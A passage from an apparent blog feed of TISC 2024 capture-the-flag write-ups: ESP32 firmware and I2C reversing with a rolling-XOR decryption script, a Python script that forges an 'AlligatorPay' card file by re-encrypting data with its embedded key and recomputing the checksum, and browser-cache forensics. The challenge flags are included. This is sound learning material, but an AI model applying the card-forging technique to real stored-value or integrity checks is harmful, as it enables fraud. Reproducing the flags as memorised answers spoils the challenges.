+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TISC{m@ny_inf0_frOm_l0gs_&amp;_me-0-wn1t0r1nNnG\\//[&gt;^n^&lt;]\\//}
+</code></pre></div></div>
+
+<h1 id="thoughts">Thoughts</h1>
+<p>Personally i believe that if anyone wants to succeed well in this challenge, familiarisation with the AWS platform and its various services (e.g Lambda, IAM, etc). I was pretty lucky to have been exposed to this very early on, just that the tedious part was to go through tons and tons of CloudTrail logs (that were in JSON format). And to be frank, the ‘jq’ command was seriously a godsend, so thank you to whoever had invented this tool &lt;3</p>
+
+<p>But, i think last year challenge was pretty cool as i remember dealing with IAMs and the AWS CodePipeline (which involved exploiting a vulnerability from there). In other words i was expecting more of an AWS pentest exercise for this challenge, but oh wells :) still thankful in terms of upgrading my knowledge on AWS services and more importantly processing CloudTrail logs.</p>]]></content><author><name>baesenseii</name></author><category term="ctf" /><category term="tisc2024" /><summary type="html"><![CDATA[Well based on the description alone it seems that there are two parts to this CTF and we are to look through tons of logs (based on the provided ZIP file, UGHHHH).]]></summary></entry><entry><title type="html">CSIT TISC 2024 CTF Challenge 5 - Hardware isn’t that Hard!</title><link href="http://localhost:4000/posts/tisc24_challenge_5_c8ec6a29/" rel="alternate" type="text/html" title="CSIT TISC 2024 CTF Challenge 5 - Hardware isn’t that Hard!" /><published>2024-10-18T00:00:00-05:00</published><updated>2024-10-18T00:00:00-05:00</updated><id>http://localhost:4000/posts/tisc24_challenge_5_c8ec6a29</id><content type="html" xml:base="http://localhost:4000/posts/tisc24_challenge_5_c8ec6a29/"><![CDATA[<p>To be frank, for this challenge, I had like A LOT OF ADVICE from many of my buddies in terms of how to approach this challenge as this 
+HUGE CREDIT TO MAH BUDDY THAT I MANAGED TO PULL INTO THIS HELLHOLE cExplr for this TISC challenge (I seriously wouldn’t have be able to do this without him man, and I learnt the MOST out of it).</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930055143.png" alt="" /></p>
+
+<p>Solving the challenge involves 3 parts:</p>
+<ul>
+  <li>Reverse Engineering of the flash dump</li>
+  <li>Reverse Engineering of I2C communication with the implant</li>
+  <li>Putting the puzzle together and getting the goddamn flag
+    <h1 id="re-of-flash-dump">RE of Flash Dump</h1>
+  </li>
+</ul>
+
+<p>Challenge starts off by providing a dump file of the i2c implant (command syntax used for dumping the image was via esptool, which meant that the dump we’re dealing with had something to do with ESP32). I tried out many ESP32 tools on GitHub, but the one that had the most success of carving out the various partitions is this tool:</p>
+
+<p><a href="https://github.com/BlackVS/esp32knife" title="https://github.com/BlackVS/esp32knife">https://github.com/BlackVS/esp32knife</a></p>
+
+<p>An interesting output was an ELF file, which was loaded onto mah fav disassembler Ghidra, and that’s when I knew, idk wtf I was doing. It took me a while to find out what I was reading using the various strings from the dram0.data segment (there was a fake flag and some other strings):</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241017232832.png" alt="" /></p>
+
+<p>But apart from that, meh, kinda hit a rock wall via this approach. Let’s try interacting with the network service I2C comms.</p>
+<h2 id="re-of-i2c-communications">RE of I2C Communications</h2>
+
+<p>An attempt was made to connect to chals.tisc24.ctf.sg via 61622 and saw a very nice ASCII diagram that indicates I2C.</p>
+<ul>
+  <li>there are 3 commands: SEND, RECV, EXIT.</li>
+  <li>after painstakingly reading so about i2c comms, there are two things that we need to find out: what addressing scheme is it using, and what is the slave address of the i2c implant.</li>
+  <li>thanks to the example written for the SEND command, we can establish that it is using a 7-bit addressing scheme (MSB contains 7-bit address value + 1-bit to determine write (0) or read (1) operation)</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241017233808.png" alt="" />
+After numerous automated trial and errors on the data, an amazing breakthrough appeared when the following sequence of data was sent:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEND D2 46 
+SEND D3 
+RECV 20
+</code></pre></div></div>
+
+<p>Surprisingly, the returned bytes were NOT ZEROES. And it did make sense on the order of the commands given. Here’s a quick breakdown of what happened:</p>
+<ul>
+  <li>For the first command, payload 46 was written to address 0x69 (SEND D2 46) on the I2C bus</li>
+  <li>A read condition was also sent to the I2C bus so that we can read off the bytes from the same I2C bus via our buffer</li>
+  <li>The RECV command reads the bytes off the buffer (which in this case prints out some weird bytes that are finally NOT ZERO)</li>
+</ul>
+
+<p>And it turns out that we’ve accidentally found the slave address too, hurray for that! Now we gotta try to make sense of what we have between the disassembled code and the behavior we observed.</p>
+<h2 id="back-to-the-app"><strong>Back to the app</strong></h2>
+
+<ul>
+  <li>Now that we know how to talk to the app, it’s time to figure out what caused the output.</li>
+  <li>After going through the disassembled ESP32 code, a particular function of interest was discovered @ FUN_400d1614 that was spitting output.</li>
+  <li>realised that using the 3 commands above, sending the payload 4D results in the CrapTPM banner to be displayed, whereas payload 46 results in an “encrypted” form of the flag.</li>
+  <li>the encryption involves a byte-level XOR encryption as seen in the disassembled code, or what seems to be some form of a custom rolling XOR encryption (as seen in the function):</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241021214409.png" alt="" /></p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241017234015.png" alt="" /></p>
+
+<p>The “custom_rolling_xor” function utilises a global ‘key’ variable that aids in the XOR encryption process.
+What makes it even more interesting is that even though the key is an unsigned short variable (16-bit, 2 bytes), only the lower 8 bits of the key was used as the resulting value was a byte worth (8-bit).</p>
+
+<p>As it is common knowledge for this CTF that the first 5 characters of the flag start with ‘TISC{‘, we could do a sample XOR operation with the encrypted value for each character, however due to the bit shifts on an unsigned short variable during the key generation, reversing it back will not be possible due to possible data loss.</p>
+
+<p>So this was the approach taken to obtain the flag:</p>
+
+<p>1) The first XOR operation was performed between the 1st byte of the encrypted value (from the I2C bus) and the letter “T”. This is to obtain the first half (first 8-bits) of the global xor key (which is originally 16-bits).</p>
+
+<p>In context, the design of the global XOR key is as follows:</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>-first_half-</td>
+      <td>-second_half-</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>2) A brute force attack is performed to guess the second half (second 8-bits) of the global xor key. To verify if the value is correct, we have do another XOR operation with letter “I” and the 2nd byte of the encrypted value (from the I2C bus)
+3) Once the second half is guessed, the second half gets moved to the first half of the global XOR key, leaving the second half again for guessing.
+4) Steps 2 and 3 are then repeated again with the following pairs:</p>
+<ul>
+  <li>“S” and 3rd byte of ciphertext</li>
+  <li>“C” and 4th byte of ciphertext</li>
+  <li>”{“ and 5th byte of ciphertext.</li>
+</ul>
+
+<p>For subsequent bytes (after the “{“), we noticed that bruteforce attacks of the second half of the global XOR key is based on the <strong>FIRST</strong> instance of the bruteforce result to generate the subsequent ciphertext values.</p>
+
+<p>So with this pattern guessing method in mind, the key was then discovered for each byte. From there, just simply decrypt the ciphertext from the I2C bus with the actual key and you get the flag:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054335.png" alt="" /></p>
+
+<p>Script used is as follows below (note that this script uses recursive functions to obtain the key):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># key is global and will be reused
+</span>
+<span class="c1">#!/usr/bin/python3
+</span>
+<span class="k">def</span> <span class="nf">custom_rolling</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">key</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">key</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+    <span class="n">temp</span> <span class="o">=</span><span class="p">(</span><span class="n">temp</span> <span class="o">&gt;&gt;</span> <span class="mi">9</span> <span class="o">^</span> <span class="n">temp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>  
+    <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">^</span> <span class="n">temp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+
+    <span class="k">return</span> <span class="n">key</span>
+
+<span class="c1"># for i in range(0xff):
+#     check = []
+#     key = 0x4f
+#     key = (i&lt;&lt;8)|key
+#     temp_key = key
+</span>
+<span class="c1">#     custom_rolling()
+#     if (key&amp;0xff) == 0xaa:
+#         print("key : ", hex(temp_key))
+#         print("FOUND")
+</span>
+<span class="c1">#after 1 round of rolling
+</span><span class="n">key</span> <span class="o">=</span> <span class="mh">0x6d4f</span>
+
+<span class="n">possible_key</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x6d4f</span><span class="p">]</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">custom_rolling</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">New key : </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">possible_key</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">possible_key</span><span class="p">))</span>
+
+<span class="n">TPM_val</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x1b</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">]</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">possible_key</span><span class="p">)):</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">TPM_val</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">possible_key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Flag: TISC{hwfuninnit}</p>
+<h1 id="thoughts">Thoughts</h1>
+<p>Not going to lie but i was initially lost in this, but it took me a considerable amount of time to understand not only the Ghidra output but also the bit shifts (both left and right) that really threw me off many times. But thankfully with some guidance, i was able to do it, and i totally learnt alot from this!</p>]]></content><author><name>baesenseii</name></author><category term="ctf" /><category term="tisc2024" /><summary type="html"><![CDATA[To be frank, for this challenge, I had like A LOT OF ADVICE from many of my buddies in terms of how to approach this challenge as this HUGE CREDIT TO MAH BUDDY THAT I MANAGED TO PULL INTO THIS HELLHOLE cExplr for this TISC challenge (I seriously wouldn’t have be able to do this without him man, and I learnt the MOST out of it).]]></summary></entry><entry><title type="html">CSIT TISC 2024 CTF Challenge 4 - AlligatorPay</title><link href="http://localhost:4000/posts/tisc24_challenge_4_9c752a2b/" rel="alternate" type="text/html" title="CSIT TISC 2024 CTF Challenge 4 - AlligatorPay" /><published>2024-10-17T00:00:00-05:00</published><updated>2024-10-17T00:00:00-05:00</updated><id>http://localhost:4000/posts/tisc24_challenge_4_9c752a2b</id><content type="html" xml:base="http://localhost:4000/posts/tisc24_challenge_4_9c752a2b/"><![CDATA[<p>I guess the one thing that i will remember from this challenge is this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Alligator Pay, Alligator Pay
+Swipe me up, you're on your way.
+Safe and fast, every day,
+Alligator leads the way!
+</code></pre></div></div>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930055121.png" alt="" /></p>
+
+<p>HAHAHAHAHA! Anyway back to the writeup.</p>
+
+<p>So we are presented with a web application that takes in a specific Alligator Pay Card and present the current balance of the card. The sample testcard.agpay file is as follows:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054003.png" alt="" /></p>
+
+<p>As there were no HTTP requests being sent upon uploading the testcard.agpay file into the web application, it is highly possible that the whole web application’s logic was mainly client-side. And as it turns out…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const arrayBuffer = await file.arrayBuffer();
+        const dataView = new DataView(arrayBuffer);
+
+        const signature = getString(dataView, 0, 5);
+        if (signature !== "AGPAY") {
+          alert("Invalid Card");
+          return;
+        }
+        const version = getString(dataView, 5, 2);
+        const encryptionKey = new Uint8Array(arrayBuffer.slice(7, 39));
+        const reserved = new Uint8Array(arrayBuffer.slice(39, 49));
+
+        const footerSignature = getString(
+          dataView,
+          arrayBuffer.byteLength - 22,
+          6
+        );
+        if (footerSignature !== "ENDAGP") {
+          alert("Invalid Card");
+          return;
+        }
+        const checksum = new Uint8Array(
+          arrayBuffer.slice(arrayBuffer.byteLength - 16, arrayBuffer.byteLength)
+        );
+
+        const iv = new Uint8Array(arrayBuffer.slice(49, 65));
+        const encryptedData = new Uint8Array(
+          arrayBuffer.slice(65, arrayBuffer.byteLength - 22)
+        );
+
+        const calculatedChecksum = hexToBytes(
+          SparkMD5.ArrayBuffer.hash(new Uint8Array([...iv, ...encryptedData]))
+        );
+
+        if (!arrayEquals(calculatedChecksum, checksum)) {
+          alert("Invalid Card");
+          return;
+        }
+
+        const decryptedData = await decryptData(
+          encryptedData,
+          encryptionKey,
+          iv
+        );
+
+        const cardNumber = getString(decryptedData, 0, 16);
+        const cardExpiryDate = decryptedData.getUint32(20, false);
+        const balance = decryptedData.getBigUint64(24, false);
+[21:42]
+ocument.getElementById("cardNumber").textContent =
+          formatCardNumber(cardNumber);
+        document.getElementById("cardExpiryDate").textContent =
+          "VALID THRU " + formatDate(new Date(cardExpiryDate * 1000));
+        document.getElementById("balance").textContent =
+          "$" + balance.toString();
+        console.log(balance);
+        if (balance == 313371337) {
+          function arrayBufferToBase64(buffer) {
+            let binary = "";
+            const bytes = new Uint8Array(buffer);
+            const len = bytes.byteLength;
+            for (let i = 0; i &lt; len; i++) {
+              binary += String.fromCharCode(bytes[i]);
+            }
+            return window.btoa(binary);
+          }
+</code></pre></div></div>
+
+<p>After carefully studying this god-foresaken piece of JavaScript code, it seems that to get the flag, we need to get the balance of the card to be 313371337. Setting the balance of the AlligatorPay card isn’t that straightforward because of the various integrity-level checks + encryption that is being done during the construction of the card.</p>
+
+<p>As such, a detailed breakdown of the card’s structure has been documented by yours truly:</p>
+
+<p><strong><em>Card structure (based on 135 bytes)</em></strong></p>
+<ul>
+  <li>byte 0 to byte 4 =&gt; signature “AGPAY”</li>
+  <li>byte 5 to byte 6 =&gt; version</li>
+  <li>byte 7 to byte 38 =&gt; encryption key</li>
+  <li>byte 39 to byte 48 =&gt; reserved</li>
+  <li>byte 49 to byte 64 =&gt; iv</li>
+  <li>byte 65 to byte 112 =&gt; encrypted data</li>
+  <li>byte 113 to byte 117 =&gt; footer signature “ENDAGP”</li>
+  <li>byte 118 to 134 =&gt; checksum (iv + encrypted data =&gt; md5hash) (edited)</li>
+</ul>
+
+<p>The decrypted data (48 bytes in its encrypted state) contains the following data structure:</p>
+<ul>
+  <li>byte 0 to byte 15 =&gt; cardNumber</li>
+  <li>byte 16 to byte 19 =&gt; some standard byte data (no idea what it is)</li>
+  <li>byte 20 to byte 23 =&gt; card expiry date (unsigned 32-bit int)</li>
+  <li>byte 24 to byte 31 =&gt; balance of card (unsigned 32-bit int, big indian notation)</li>
+  <li>byte 32 to byte 48 =&gt; i don’t really care.</li>
+</ul>
+
+<p>Based on this understanding, and my scripting brain, the following Python script was used to reconstruct a new AlligatorPay card with the intended balance of 313371337 (this requires the testcard.agpay as a reference card template):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/python3
+
+from Crypto.Cipher import AES
+import hashlib
+import base64
+import struct
+
+def constructCCDetails(cardNumber, standardT, cardExpiryDate, balance):
+	add_padding = '\x10' * 16
+	ccDetails = bytearray(cardNumber) + bytearray(standardT) + bytearray(cardExpiryDate) + bytearray(balance) + bytearray(add_padding.encode())
+	return bytes(ccDetails)
+
+def decrypt(data,key,iv):
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+	decryptedtext = cipher.decrypt(data)   # Base64 decode the ciphertext
+	return decryptedtext
+
+def encrypt(data,key,iv):
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+	encryptedtext = cipher.encrypt(data)
+	return encryptedtext
+
+def calculate_checksum(data):
+    md5_hash = hashlib.md5(data)
+    return md5_hash.digest()
+
+###
+# 
+# Objective is just to replace the balance value and reconstruct the credit card details properly.
+#
+###
+
+sample = open("./testcard.agpay","rb")
+
+# get total bytes length
+byte_length_sample = len(sample.read())
+
+### keeping the items
+# get signature
+sample.seek(0)
+signature = sample.read(5)
+
+# get version
+sample.seek(5)
+version = sample.read(2)
+
+# get encryptionKey
+sample.seek(7)
+key = sample.read(39-7)
+
+# get reserved
+sample.seek(39)
+reserved = sample.read(49-39)
+
+# get footer signature
+sample.seek(byte_length_sample - 22)
+footerSignature = sample.read(6)
+
+# get checksum
+sample.seek(byte_length_sample - 16)
+checksum = sample.read(16)
+
+# get iv
+sample.seek(49)
+iv = sample.read(65-49)
+
+# get encrypted data
+sample.seek(65)
+encryptedData = sample.read(byte_length_sample-22-65)
+
+sample.seek(113)
+
+decryptedData = decrypt(encryptedData,key,iv)
+
+cardNumber = decryptedData[0:16]
+standardT = decryptedData[16:20]
+cardExpiryDate = decryptedData[20:24]
+balance = decryptedData[24:32]
+
+# Define the offset and endianness (little-endian by default) =&gt; this is to handle the balance value which is in big endian notation.
+offset = 0 
+little_endian = False
+
+v_balance = struct.unpack('&gt;Q' if not little_endian else '&lt;Q',balance)[0]
+new_balance = struct.pack('&gt;Q' if not little_endian else '&lt;Q',313371337)
+v_new_balance = struct.unpack('&gt;Q' if not little_endian else '&lt;Q',new_balance)[0]
+
+##################################################################
+#
+# construct new credit card details
+#
+##################################################################
+new_cc_details = constructCCDetails(cardNumber,standardT,cardExpiryDate,new_balance)
+new_cc_details_enc = encrypt(new_cc_details, key, iv)
+new_checksum = calculate_checksum(bytes(bytearray(iv) + bytearray(new_cc_details_enc)))
+
+new_cc = bytearray(signature) + bytearray(version) + bytearray(key) + bytearray(reserved) + bytearray(iv) + bytearray(new_cc_details_enc) + bytearray(footerSignature) + bytearray(new_checksum)
+
+f2 = open('newcard.agpay','wb')
+f2.write(bytes(new_cc))
+f2.close()
+sample.close()
+
+</code></pre></div></div>
+
+<p>The new card was then uploaded into the web application, and there you go, le flag:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930054042.png" alt="" /></p>
+
+<p>Flag: TISC{533_Y4_L4T3R_4LL1G4T0R_a8515a1f7004dbf7d5f704b7305cdc5d}</p>
+
+<h1 id="thoughts">Thoughts</h1>
+
+<p>I would say this is a really good brain teaser to work on one of the most fundamental skills of reverse engineering, which is to build your ACTUAL understanding of the application on how it works (from the submission of the AG card to the displaying of balance on the site).</p>
+
+<p>I also took this opportunity to practise my scripting skills (yes yes, i know people keep talking about using GenAI to create the script, but i believe that by doing so, you shortchange the ability to think logically in terms of the flow of data when building your script). I know that many people would rather just edit the provided AG card using hex editors and such, but the idea of scripting out the construct of the new AG card personally helps you as a security researcher to logically provide a solution to anyone without effort required.</p>
+
+<p>I mean, even taking the effort to do a writeup something like this takes a considerable amount of effort for me because it requires me to think about the flow / thought process when approaching the challenge and how do i convey it right so that people can comprehend the writeup after reading it.</p>]]></content><author><name>baesenseii</name></author><category term="ctf" /><category term="tisc2024" /><summary type="html"><![CDATA[I guess the one thing that i will remember from this challenge is this:]]></summary></entry><entry><title type="html">CSIT TISC 2024 CTF Challenge 3 - Digging Up History</title><link href="http://localhost:4000/posts/tisc24_challenge_3_8ab5e6e3/" rel="alternate" type="text/html" title="CSIT TISC 2024 CTF Challenge 3 - Digging Up History" /><published>2024-10-16T00:00:00-05:00</published><updated>2024-10-16T00:00:00-05:00</updated><id>http://localhost:4000/posts/tisc24_challenge_3_8ab5e6e3</id><content type="html" xml:base="http://localhost:4000/posts/tisc24_challenge_3_8ab5e6e3/"><![CDATA[<p>Quite a cheesy description for this challenge, but it looks to me that this is some forensics related stuff that we need to deal with (sigh, i don’t really like forensics to be honest haha).</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930053657.png" alt="" /></p>
+
+<p>The moment the ZIP file was downloaded and unzipped (password for the ZIP file was located in the provided metadata.txt file), we are presented with the following information:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241017002917.png" alt="" /></p>
+
+<p>Just by the file extension alone, it turns out that this is a disk image created using AccessData FTK. There is a free tool called FTK Imager that you can use to access the image (works well on Windows), so I fired up my FLARE VM and installed FTK Imager. Once done, the .ad1 file was loaded and this is what was shown (which looks like a typical C:\ drive of a machine with Windows installed):</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930053707.png" alt="" /></p>
+
+<p>Now do note that this is on Windows, and i just hate searching files through the User Interface (because imma leet hacker, and hackerz only use CLI to navigate). So I decided to export out all the files and transfer it to my Linux host machine:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930053712.png" alt="" /></p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930053717.png" alt="" /></p>
+
+<p>Now one of the main things in Computer Forensics that you would usually do is to get a quick sensing, or a profile of the softwares that are being used. In the Challenge Description it was mentioned that the target of interest has “a history of hiding sensitive data through file sharing sites…”, which indicates that it has something to do with web history data. This brings us to the “Application Data” folder for the main user csitfan1, which shows folders whose names represent famous web browses (e.g Mozilla = Firefox, Microsoft = Edge):</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930053726.png" alt="" /></p>
+
+<p>The folder Mypal68 was an interesting folder as i have never seen it before, but it turns out that it is also a web browser that allows compatibility of websites powered by new technology such as HTML5, via outdated, unsupported systems such as Windows XP:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930053743.png" alt="" /></p>
+
+<p>And since we can leverage Linux and its powerful string manipulation and file searches using a variety of Linux commands, the following Linux command was used to dump all the URLs visited via the Mypal68 folder (as it was the biggest in file size), and write it to a file called ‘urlhistory_mypal68.txt’:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings Local Settings/Application Data/Mypal68/Profiles/a80ofn6a.default-default/cache2/* | grep -ar -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | cut -d ":" -f 2,3 | sort -u &gt; ~/Documents/tisc_2024/challenge3/urlhistory_mypal68.txt
+</code></pre></div></div>
+
+<p>When going through the list, we see a familiar URL that is notoriously known for file storage (and the filename was a giveaway too):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+...
+https://csitfan-chall.s3.amazonaws.com/flag.sus
+...
+...
+</code></pre></div></div>
+
+<p>The file was then downloaded and it turned out to be a Base64-encoded string value. All it took was to use the built-in base64 decoder program in Linux and VOILA, the flag appears :)</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241017004309.png" alt="" />
+<img src="/assets/images/tisc-2024/Pasted image 20241017004430.png" alt="" /></p>
+
+<p>Flag: TISC{tru3_1nt3rn3t_h1st0r13_8445632pq78dfn3s}</p>
+<h1 id="thoughts">Thoughts</h1>
